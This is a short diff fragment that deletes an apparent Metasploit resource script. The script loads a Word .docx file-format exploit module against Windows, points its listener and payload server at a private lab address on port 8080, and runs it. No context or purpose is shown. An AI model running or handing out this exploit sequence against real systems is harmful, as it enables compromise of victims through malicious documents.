@@ -1,5 +1,0 @@
-use exploit/windows/fileformat/office_word_docx
-set lhost 192.168.56.106
-set SRVHOST 192.168.56.106
-set SRVPORT 8080
-run
